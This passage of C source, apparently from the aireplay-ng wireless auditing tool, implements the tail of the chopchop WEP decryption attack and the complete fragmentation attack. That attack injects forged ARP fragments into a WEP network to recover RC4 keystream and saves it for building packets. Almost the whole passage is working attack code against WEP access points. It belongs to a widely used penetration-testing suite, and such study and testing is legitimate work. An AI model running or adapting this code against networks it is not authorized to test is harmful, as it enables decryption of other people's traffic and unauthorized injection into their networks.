h80211[i] ^ chopped[i-diff];\n\n                /* sometimes the header length or the tos field vary */\n\n                for( i = 0; i < 16; i++ )\n                {\n                    h80211[z +  8] = 0x40 + i;\n                    chopped[24 + 12] = srcbuf[srcz + 12] ^ ( 0x40 + i );\n\n                    for( j = 0; j < 256; j++ )\n                    {\n                        h80211[z +  9] = j;\n                        chopped[24 + 13] = srcbuf[srcz + 13] ^ j;\n\n                        if( check_crc_buf( h80211 + z, caplen - z - 8 ) )\n                            goto have_crc_match;\n                    }\n                }\n\n                printf( \"This doesn't look like an IP packet, \"\n                        \"try another one.\\n\" );\n            }\n\n        have_crc_match:\n            break;\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )\n        {\n            /* send one modified frame */\n\n            ticks[2] = 0;\n\n            memcpy( h80211, chopped, data_end - 1 );\n\n            /* note: guess 256 is special, it tests if the  *\n             * AP properly drops frames with an invalid ICV *\n             * so this guess always has its bit 8 set to 0  */\n\n            if( is_deauth_mode )\n            {\n                opt.r_smac[1] |= ( guess < 256 );\n                opt.r_smac[5]  = guess & 0xFF;\n            }\n            else\n            {\n                opt.r_dmac[1] |= ( guess < 256 );\n                opt.r_dmac[5]  = guess & 0xFF;\n            }\n\n            memcpy( h80211 + 10, opt.r_smac,  6 );\n            memcpy( h80211 + 16, opt.r_dmac,  6 );\n\n            if( guess < 256 )\n            {\n                h80211[data_end - 2] ^= crc_chop_tbl[guess][3];\n                h80211[data_end - 3] ^= crc_chop_tbl[guess][2];\n                h80211[data_end - 4] ^= crc_chop_tbl[guess][1];\n                h80211[data_end - 5] ^= crc_chop_tbl[guess][0];\n            }\n\n            errno = 0;\n\n            if( send_packet( h80211, data_end -1 ) != 0 )\n                return( 1 );\n\n            if( errno != EAGAIN )\n            {\n                guess++;\n\n                if( guess > 256 )\n                    guess = 0;\n            }\n        }\n\n        /* watch for a response from the AP */\n\n        n = read_packet( h80211, sizeof( h80211 ), NULL );\n\n        if( n  < 0 ) return( 1 );\n        if( n == 0 ) continue;\n\n        nb_pkt_read++;\n\n        /* check if it's a deauth packet */\n\n        if( h80211[0] == 0xA0 || h80211[0] == 0xC0 )\n        {\n            if( memcmp( h80211 + 4, opt.r_smac, 6 ) == 0 &&\n                ! is_deauth_mode )\n            {\n                nb_bad_pkt++;\n\n                if( nb_bad_pkt > 256 )\n                {\n                    printf(\"\\rgot several deauthentication packets - pausing 3 seconds for reconnection\\n\");\n                    sleep(3);\n                    nb_bad_pkt = 0;\n                }\n\n                continue;\n            }\n\n            if( h80211[4] != opt.r_smac[0] ) continue;\n            if( h80211[6] != opt.r_smac[2] ) continue;\n            if( h80211[7] != opt.r_smac[3] ) continue;\n            if( h80211[8] != opt.r_smac[4] ) continue;\n\n            if( ( h80211[5]     & 0xFE ) !=\n                ( opt.r_smac[1] & 0xFE ) ) continue;\n\n            if( ! ( h80211[5] & 1 ) )\n            {\n            \tif( data_end < 41 ) goto header_rec;\n\n                printf( \"\\n\\nFailure: the access point does not properly \"\n                        \"discard frames with an\\ninvalid ICV - try running \"\n                        \"aireplay-ng in authenticated mode (-h) instead.\\n\\n\" );\n                return( 1 );\n            }\n        }\n        else\n        {\n            if( is_deauth_mode )\n                continue;\n\n            /* check if it's a WEP data packet */\n\n            if( ( h80211[0] & 0x0C ) != 8 ) continue;\n            if( ( h80211[0] & 0x70 ) != 0 ) continue;\n            if( ( h80211[1] & 0x03 ) != 2 ) continue;\n            if( ( h80211[1] & 0x40 ) == 0 ) continue;\n\n            /* check the extended IV (TKIP) flag */\n\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            if( ( h80211[z + 3] & 0x20 ) != 0 ) continue;\n\n            /* check the destination address */\n\n            if( h80211[4] != opt.r_dmac[0] ) continue;\n            if( h80211[6] != opt.r_dmac[2] ) continue;\n            if( h80211[7] != opt.r_dmac[3] ) continue;\n            if( h80211[8] != opt.r_dmac[4] ) continue;\n\n            if( ( h80211[5]     & 0xFE ) !=\n                ( opt.r_dmac[1] & 0xFE ) ) continue;\n\n            if( ! ( h80211[5] & 1 ) )\n            {\n            \tif( data_end < 41 ) goto header_rec;\n\n                printf( \"\\n\\nFailure: the access point does not properly \"\n                        \"discard frames with an\\ninvalid ICV - try running \"\n                        \"aireplay-ng in non-authenticated mode instead.\\n\\n\" );\n                return( 1 );\n            }\n        }\n\n        /* we have a winner */\n\n        guess = h80211[9];\n\n        chopped[data_end - 1] ^= guess;\n        chopped[data_end - 2] ^= crc_chop_tbl[guess][3];\n        chopped[data_end - 3] ^= crc_chop_tbl[guess][2];\n        chopped[data_end - 4] ^= crc_chop_tbl[guess][1];\n        chopped[data_end - 5] ^= crc_chop_tbl[guess][0];\n\n        n = caplen - data_start;\n\n        printf( \"\\rOffset %4d (%2d%% done) | xor = %02X | pt = %02X | \"\n                \"%4ld frames written in %5.0fms\\n\", data_end - 1,\n                100 * ( caplen - data_end ) / n,\n                chopped[data_end - 1],\n                chopped[data_end - 1] ^ srcbuf[data_end + srcdiff - 1],\n                nb_pkt_sent, ticks[3] );\n\n        if( is_deauth_mode )\n        {\n            opt.r_smac[1] = rand() & 0x3E;\n            opt.r_smac[2] = rand() & 0xFF;\n            opt.r_smac[3] = rand() & 0xFF;\n            opt.r_smac[4] = rand() & 0xFF;\n        }\n        else\n        {\n            opt.r_dmac[1] = rand() & 0xFE;\n            opt.r_dmac[2] = rand() & 0xFF;\n            opt.r_dmac[3] = rand() & 0xFF;\n            opt.r_dmac[4] = rand() & 0xFF;\n        }\n\n        ticks[3]        = 0;\n        nb_pkt_sent     = 0;\n        nb_bad_pkt      = 0;\n        guess           = 256;\n\n        data_end--;\n\n        alarm( 0 );\n    }\n\n    /* reveal the plaintext (chopped contains the prga) */\n\n    memcpy( h80211, srcbuf, caplen );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n        z+=2;\n    diff = z-24;\n\n    chopped[24 + 4] = srcbuf[srcz + 4] ^ b1;\n    chopped[24 + 5] = srcbuf[srcz + 5] ^ b2;\n    chopped[24 + 6] = srcbuf[srcz + 6] ^ 0x03;\n    chopped[24 + 7] = srcbuf[srcz + 7] ^ 0x00;\n    chopped[24 + 8] = srcbuf[srcz + 8] ^ 0x00;\n    chopped[24 + 9] = srcbuf[srcz + 9] ^ 0x00;\n\n    for( i = z + 4; i < (int) caplen; i++ )\n        h80211[i - 4] = h80211[i] ^ chopped[i-diff];\n\n    if( ! check_crc_buf( h80211 + z, caplen - z - 8 ) ) {\n        if (!tried_header_rec) {\n            printf( \"\\nWarning: ICV checksum verification FAILED! Trying workaround.\\n\" );\n            tried_header_rec=1;\n            goto header_rec;\n        } else {\n            printf( \"\\nWorkaround couldn't fix ICV checksum.\\nPacket is most likely invalid/useless\\nTry another one.\\n\" );\n        }\n    }\n\n    caplen -= 4 + 4; /* remove the WEP IV & CRC (ICV) */\n\n    h80211[1] &= 0xBF;   /* remove the WEP bit, too */\n\n    /* save the decrypted packet */\n\n    gettimeofday( &tv, NULL );\n\n    pfh_out.magic         = TCPDUMP_MAGIC;\n    pfh_out.version_major = PCAP_VERSION_MAJOR;\n    pfh_out.version_minor = PCAP_VERSION_MINOR;\n    pfh_out.thiszone      = 0;\n    pfh_out.sigfigs       = 0;\n    pfh_out.snaplen       = 65535;\n    pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n    pkh.tv_sec  = tv.tv_sec;\n    pkh.tv_usec = tv.tv_usec;\n    pkh.caplen  = caplen;\n    pkh.len     = caplen;\n\n    lt = localtime( (const time_t *) &tv.tv_sec );\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_dec-%02d%02d-%02d%02d%02d.cap\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"\\nSaving plaintext in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = sizeof( struct pcap_file_header );\n\n    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\\n\" );\n        return( 1 );\n    }\n\n    n = sizeof( pkh );\n\n    if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\" );\n        return( 1 );\n    }\n\n    n = pkh.caplen;\n\n    if( fwrite( h80211, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\" );\n        return( 1 );\n    }\n\n    fclose( f_cap_out );\n\n    /* save the RC4 stream (xor mask) */\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_dec-%02d%02d-%02d%02d%02d.xor\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"Saving keystream in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = pkh.caplen + 8 - 24;\n\n    if( fwrite( chopped + 24, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\" );\n        return( 1 );\n    }\n\n    fclose( f_cap_out );\n\n    printf( \"\\nCompleted in %lds (%0.2f bytes/s)\\n\\n\",\n            (long) time( NULL ) - tt,\n            (float) ( pkh.caplen - 6 - 24 ) /\n            (float) ( time( NULL ) - tt  ) );\n\n    return( 0 );\n}\n\nint make_arp_request(unsigned char *h80211, unsigned char *bssid, unsigned char *src_mac, unsigned char *dst_mac, unsigned char *src_ip, unsigned char *dst_ip, int size)\n{\n\tunsigned char *arp_header = (unsigned char*)\"\\xaa\\xaa\\x03\\x00\\x00\\x00\\x08\\x06\\x00\\x01\\x08\\x00\\x06\\x04\\x00\\x01\";\n\tunsigned char *header80211 = (unsigned char*)\"\\x08\\x41\\x95\\x00\";\n\n    // 802.11 part\n    memcpy(h80211,    header80211, 4);\n    memcpy(h80211+4,  bssid,       6);\n    memcpy(h80211+10, src_mac,     6);\n    memcpy(h80211+16, dst_mac,     6);\n    h80211[22] = '\\x00';\n    h80211[23] = '\\x00';\n\n    // ARP part\n    memcpy(h80211+24, arp_header, 16);\n    memcpy(h80211+40, src_mac,     6);\n    memcpy(h80211+46, src_ip,      4);\n    memset(h80211+50, '\\x00',      6);\n    memcpy(h80211+56, dst_ip,      4);\n\n    // Insert padding bytes\n    memset(h80211+60, '\\x00', size-60);\n\n    return 0;\n}\n\nvoid save_prga(char *filename, unsigned char *iv, unsigned char *prga, int prgalen)\n{\n    FILE *xorfile;\n    size_t unused;\n    xorfile = fopen(filename, \"wb\");\n    unused = fwrite (iv, 1, 4, xorfile);\n    unused = fwrite (prga, 1, prgalen, xorfile);\n    fclose (xorfile);\n}\n\nint do_attack_fragment()\n{\n    unsigned char packet[4096];\n    unsigned char packet2[4096];\n    unsigned char prga[4096];\n    unsigned char iv[4];\n\n//    unsigned char ack[14] = \"\\xd4\";\n\n    char strbuf[256];\n\n    struct tm *lt;\n    struct timeval tv, tv2;\n\n    int done;\n    int caplen;\n    int caplen2;\n    int arplen;\n    int round;\n    int prga_len;\n    int isrelay;\n    int again;\n    int length;\n    int ret;\n    int gotit;\n    int acksgot;\n    int packets;\n    int z;\n\n    unsigned char *snap_header = (unsigned char*)\"\\xAA\\xAA\\x03\\x00\\x00\\x00\\x08\\x00\";\n\n    done = caplen = caplen2 = arplen = round = 0;\n    prga_len = isrelay = gotit = again = length = 0;\n\n    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a source MAC (-h).\\n\" );\n        return( 1 );\n    }\n\n    if(getnet(NULL, 1, 1) != 0)\n        return 1;\n\n    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )\n    {\n        memset( opt.r_dmac, '\\xFF', 6);\n        opt.r_dmac[5] = 0xED;\n    }\n\n    if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )\n    {\n        memset( opt.r_sip, '\\xFF', 4);\n    }\n\n    if( memcmp( opt.r_dip, NULL_MAC, 4 ) == 0 )\n    {\n        memset( opt.r_dip, '\\xFF', 4);\n    }\n\n    PCT; printf (\"Waiting for a data packet...\\n\");\n\n    while(!done)  //\n    {\n        round = 0;\n\n        if( capture_ask_packet( &caplen, 0 ) != 0 )\n            return -1;\n\n        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n            z+=2;\n\n        if((unsigned)caplen > sizeof(packet) || (unsigned)caplen > sizeof(packet2))\n            continue;\n\n        memcpy( packet2, h80211, caplen );\n        caplen2 = caplen;\n        PCT; printf(\"Data packet found!\\n\");\n\n        if ( memcmp( packet2 +  4, SPANTREE, 6 ) == 0 ||\n             memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )\n        {\n            packet2[z+4] = ((packet2[z+4] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA\n            packet2[z+5] = ((packet2[z+5] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA\n            packet2[z+10] = ((packet2[z+10] ^ 0x00) ^ 0x08);  //0x00 instead of 0x08\n        }\n\n        prga_len = 7;\n\n        again = RETRY;\n\n        memcpy( packet, packet2, caplen2 );\n        caplen = caplen2;\n        memcpy(prga, packet+z+4, prga_len);\n        memcpy(iv, packet+z, 4);\n\n        xor_keystream(prga, snap_header, prga_len);\n\n        while(again == RETRY)  //sending 7byte fragments\n        {\n            again = 0;\n\n            arplen=60;\n            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);\n\n            if ((round % 2) == 1)\n            {\n                PCT; printf(\"Trying a LLC NULL packet\\n\");\n                memset(h80211+24, '\\x00', 39);\n                arplen=63;\n            }\n\n            acksgot=0;\n            packets=(arplen-24)/(prga_len-4);\n            if( (arplen-24)%(prga_len-4) != 0 )\n                packets++;\n\n            PCT; printf(\"Sending fragmented packet\\n\");\n            send_fragments(h80211, arplen, iv, prga, prga_len-4, 0);\n//            //Plus an ACK\n//            send_packet(ack, 10);\n\n            gettimeofday( &tv, NULL );\n\n\n            while (!gotit)  //waiting for relayed packet\n            {\n                caplen = read_packet(packet, sizeof(packet), NULL);\n                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;\n                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */\n                    z+=2;\n\n                if (packet[0] == 0xD4 )\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                    {\n                        acksgot++;\n                    }\n                    continue;\n                }\n\n                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted\n                {\n                    if ( (packet[1] & 2) )  //Is a FromDS packet\n                    {\n                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC\n                        {\n                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC\n                            {\n                                if (caplen-z < 66)  //Is short enough\n                                {\n                                    //This is our relayed packet!\n                                    PCT; printf(\"Got RELAYED packet!!\\n\");\n                                    gotit = 1;\n                                    isrelay = 1;\n                                }\n                            }\n                        }\n                    }\n                }\n\n                /* check if we got an deauthentication packet */\n\n                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a deauthentication packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                /* check if we got an disassociation packet */\n\n                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a disassociation packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                gettimeofday( &tv2, NULL );\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks\n                {\n                    PCT; printf(\"Not enough acks, repeating...\\n\");\n                    again = RETRY;\n                    break;\n                }\n\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer\n                {\n                    PCT; printf(\"No answer, repeating...\\n\");\n                    round++;\n                    again = RETRY;\n                    if (round > 10)\n                    {\n                        PCT; printf(\"Still nothing, trying another packet...\\n\");\n                        again = NEW_IV;\n                    }\n                    break;\n                }\n            }\n        }\n\n        if(again == NEW_IV) continue;\n\n        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);\n        if (caplen-z == 68-24)\n        {\n            //Thats the ARP packet!\n//             PCT; printf(\"Thats our ARP packet!\\n\");\n        }\n        if (caplen-z == 71-24)\n        {\n            //Thats the LLC NULL packet!\n//             PCT; printf(\"Thats our LLC Null packet!\\n\");\n            memset(h80211+24, '\\x00', 39);\n        }\n\n        if (! isrelay)\n        {\n            //Building expected cleartext\n            unsigned char ct[4096] = \"\\xaa\\xaa\\x03\\x00\\x00\\x00\\x08\\x06\\x00\\x01\\x08\\x00\\x06\\x04\\x00\\x02\";\n            //Ethernet & ARP header\n\n            //Followed by the senders MAC and IP:\n            memcpy(ct+16, packet+16, 6);\n            memcpy(ct+22, opt.r_dip,  4);\n\n            //And our own MAC and IP:\n            memcpy(ct+26, opt.r_smac,   6);\n            memcpy(ct+32, opt.r_sip,   4);\n\n            //Calculating\n            memcpy(prga, packet+z+4, 36);\n            xor_keystream(prga, ct, 36);\n        }\n        else\n        {\n            memcpy(prga, packet+z+4, 36);\n            xor_keystream(prga, h80211+24, 36);\n        }\n\n        memcpy(iv, packet+z, 4);\n        round = 0;\n        again = RETRY;\n        while(again == RETRY)\n        {\n            again = 0;\n\n            PCT; printf(\"Trying to get 384 bytes of a keystream\\n\");\n\n            arplen=408;\n\n            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);\n            if ((round % 2) == 1)\n            {\n                PCT; printf(\"Trying a LLC NULL packet\\n\");\n                memset(h80211+24, '\\x00', arplen+8);\n                arplen+=32;\n            }\n\n            acksgot=0;\n            packets=(arplen-24)/(32);\n            if( (arplen-24)%(32) != 0 )\n                packets++;\n\n            send_fragments(h80211, arplen, iv, prga, 32, 0);\n//            //Plus an ACK\n//            send_packet(ack, 10);\n\n            gettimeofday( &tv, NULL );\n\n            gotit=0;\n            while (!gotit)  //waiting for relayed packet\n            {\n                caplen = read_packet(packet, sizeof(packet), NULL);\n                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;\n                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */\n                    z+=2;\n\n                if (packet[0] == 0xD4 )\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                        acksgot++;\n                    continue;\n                }\n\n                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted\n                {\n                    if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV\n                    {\n                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC\n                        {\n                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC\n                            {\n                                if (caplen-z > 400-24 && caplen-z < 500-24)  //Is short enough\n                                {\n                                    //This is our relayed packet!\n                                    PCT; printf(\"Got RELAYED packet!!\\n\");\n                                    gotit = 1;\n                                    isrelay = 1;\n                                }\n                            }\n                        }\n                    }\n                }\n\n                /* check if we got an deauthentication packet */\n\n                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a deauthentication packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                /* check if we got an disassociation packet */\n\n                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a disassociation packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                gettimeofday( &tv2, NULL );\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks\n                {\n                    PCT; printf(\"Not enough acks, repeating...\\n\");\n                    again = RETRY;\n                    break;\n                }\n\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer\n                {\n                    PCT; printf(\"No answer, repeating...\\n\");\n                    round++;\n                    again = RETRY;\n                    if (round > 10)\n                    {\n                        PCT; printf(\"Still nothing, trying another packet...\\n\");\n                        again = NEW_IV;\n                    }\n                    break;\n                }\n            }\n        }\n\n        if(again == NEW_IV) continue;\n\n        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);\n        if (caplen-z == 416-24)\n        {\n            //Thats the ARP packet!\n//             PCT; printf(\"Thats our ARP packet!\\n\");\n        }\n        if (caplen-z == 448-24)\n        {\n            //Thats the LLC NULL packet!\n//             PCT; printf(\"Thats our LLC Null packet!\\n\");\n            memset(h80211+24, '\\x00', 416);\n        }\n\n        memcpy(iv, packet+z, 4);\n        memcpy(prga, packet+z+4, 384);\n        xor_keystream(prga, h80211+24, 384);\n\n        round = 0;\n        again = RETRY;\n        while(again == RETRY)\n        {\n            again = 0;\n\n            PCT; printf(\"Trying to get 1500 bytes of a keystream\\n\");\n\n            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 1500);\n            arplen=1500;\n            if ((round % 2) == 1)\n            {\n                PCT; printf(\"Trying a LLC NULL packet\\n\");\n                memset(h80211+24, '\\x00', 1508);\n                arplen+=32;\n            }\n\n            acksgot=0;\n            packets=(arplen-24)/(300);\n            if( (arplen-24)%(300) != 0 )\n                packets++;\n\n            send_fragments(h80211, arplen, iv, prga, 300, 0);\n//            //Plus an ACK\n//            send_packet(ack, 10);\n\n            gettimeofday( &tv, NULL );\n\n            gotit=0;\n            while (!gotit)  //waiting for relayed packet\n            {\n                caplen = read_packet(packet, sizeof(packet), NULL);\n                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;\n                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */\n                    z+=2;\n\n                if (packet[0] == 0xD4 )\n                {\n                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC\n                        acksgot++;\n                    continue;\n                }\n\n                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted\n                {\n                    if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV\n                    {\n                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC\n                        {\n                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC\n                            {\n                                if (caplen-z > 1496-24)  //Is short enough\n                                {\n                                    //This is our relayed packet!\n                                    PCT; printf(\"Got RELAYED packet!!\\n\");\n                                    gotit = 1;\n                                    isrelay = 1;\n                                }\n                            }\n                        }\n                    }\n                }\n\n                /* check if we got an deauthentication packet */\n\n                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a deauthentication packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                /* check if we got an disassociation packet */\n\n                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )\n                {\n                    PCT; printf( \"Got a disassociation packet!\\n\" );\n                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period\n                }\n\n                gettimeofday( &tv2, NULL );\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks\n                {\n                    PCT; printf(\"Not enough acks, repeating...\\n\");\n                    again = RETRY;\n                    break;\n                }\n\n                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer\n                {\n                    PCT; printf(\"No answer, repeating...\\n\");\n                    round++;\n                    again = RETRY;\n                    if (round > 10)\n                    {\n                        printf(\"Still nothing, quitting with 384 bytes? [y/n] \\n\");\n                        fflush( stdout );\n                        ret=0;\n                        while(!ret) ret = scanf( \"%s\", tmpbuf );\n\n                        printf( \"\\n\" );\n\n                        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )\n                            again = ABORT;\n                        else\n                            again = NEW_IV;\n                    }\n                    break;\n                }\n            }\n        }\n\n        if(again == NEW_IV) continue;\n\n        if(again == ABORT) length = 408;\n        else length = 1500;\n\n        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);\n        if (caplen == length+8+z)\n        {\n            //Thats the ARP packet!\n//             PCT; printf(\"Thats our ARP packet!\\n\");\n        }\n        if (caplen == length+16+z)\n        {\n            //Thats the LLC NULL packet!\n//             PCT; printf(\"Thats our LLC Null packet!\\n\");\n            memset(h80211+24, '\\x00', length+8);\n        }\n\n        if(again != ABORT)\n        {\n            memcpy(iv, packet+z, 4);\n            memcpy(prga, packet+z+4, length);\n            xor_keystream(prga, h80211+24, length);\n        }\n\n        lt = localtime( (const time_t *) &tv.tv_sec );\n\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                  \"fragment-%02d%02d-%02d%02d%02d.xor\",\n                  lt->tm_mon + 1, lt->tm_mday,\n                  lt->tm_hour, lt->tm_min, lt->tm_sec );\n        save_prga(strbuf, iv, prga, length);\n\n        printf( \"Saving keystream in %s\\n\", strbuf );\n        printf(\"Now you can build a packet with packetforge-ng out of that %d bytes keystream\\n\", length);\n\n        done=1;\n\n    }\n\n    return( 0 );\n}\n\nint grab_essid(unsigned char* packet, int len)\n{\n    int i=0, j=0, pos=0, tagtype=0, taglen=0, chan=0;\n    unsigned char bssid[6];\n\n    memcpy(bssid, packet+16, 6);\n    taglen = 22;    //initial value to get the fixed tags parsing started\n    taglen+= 12;    //skip fixed tags in frames\n    do\n    {\n        pos    += taglen + 2;\n        tagtype = packet[pos];\n        taglen  = packet[pos+1];\n    } while(tagtype != 3 && pos < len-2);\n\n    if(tagtype != 3) return -1;\n    if(taglen != 1) return -1;\n    if(pos+2+taglen > len) return -1;\n\n    chan = packet[pos+2];\n\n    pos=0;\n\n    taglen = 22;    //initial value to get the fixed tags parsing started\n    taglen+= 12;    //skip fixed tags in frames\n    do\n    {\n        pos    += taglen + 2;\n        tagtype = packet[pos];\n        taglen  = packet[pos+1];\n    } while(tagtype != 0 && pos < len-2);\n\n    if(tagtype != 0) return -1;\n    if(taglen > 250) taglen = 250;\n    if(pos+2+taglen > len) return -1;\n\n    for(i=0; i<20; i++)\n    {\n        if( ap[i].set)\n        {\n            if( memcmp(bssid, ap[i].bssid, 6) == 0 )    //got it already\n            {\n                if(packet[0] == 0x50 && !ap[i].found)\n                {\n                    ap[i].found++;\n                }\n                if(ap[i].chan == 0) ap[i].chan=chan;\n                break;\n            }\n        }\n        if(ap[i].set == 0)\n        {\n            for(j=0; j<taglen; j++)\n            {\n                if(packet[pos+2+j] < 32 || packet[pos+2+j] > 127)\n                {\n                    return -1;\n                }\n            }\n\n            ap[i].set = 1;\n            ap[i].len = taglen;\n            memcpy(ap[i].essid, packet+pos+2, taglen);\n            ap[i].essid[taglen] = '\\0';\n            memcpy(ap[i].bssid, bssid, 6);\n            ap[i].chan = chan;\n            if(packet[0] == 0x50) ap[i].found++;\n            return 0;\n        }\n    }\n    return -1;\n}\n\nstatic int get_ip_port(char *iface, char *ip, const int ip_size)\n{\n\tchar *host;\n\tchar *ptr;\n\tint port = -1;\n\tstruct in_addr addr;\n\n\thost = strdup(iface);\n\tif (!host)\n\t\treturn -1;\n\n\tptr = strchr(host, ':');\n\tif (!ptr)\n\t\tgoto out;\n\n\t*ptr++ = 0;\n\n\tif (!inet_aton(host, (struct in_addr *)&addr))\n\t\tgoto out; /* XXX resolve hostname */\n\n\tif(strlen(host) > 15)\n        {\n            port = -1;\n            goto out;\n        }\n\tstrncpy(ip, host, ip_size);\n\tport = atoi(ptr);\n        if(port <= 0) port = -1;\n\nout:\n\tfree(host);\n\treturn port;\n}\n\nvoid dump_packet(unsigned char* packet, int len)\n{\n    int i=0;\n\n    for(i=0; i<len; i++)\n    {\n        if(i>0 && i%4 == 0)printf(\" \");\n        if(i>0 && i%16 == 0)printf(\"\\n\");\n        printf(\"%02X \", packet[i]);\n    }\n    printf(\"\\n\\n\");\n}\n\nstruct net_hdr {\n\tuint8_t\t\tnh_type;\n\tuint32_t\tnh_len;\n\tuint8_t\t\tnh_data[0];\n} __packed;\n\nint tcp_test(const char* ip_str, const short port)\n{\n    int sock, i;\n    struct sockaddr_in s_in;\n    int packetsize = 1024;\n    unsigned char packet[packetsize];\n    struct timeval tv, tv2, tv3;\n    int caplen = 0;\n    int times[REQUESTS];\n    int min, avg, max, len;\n    struct net_hdr nh;\n\n    tv3.tv_sec=0;\n    tv3.tv_usec=1;\n\n    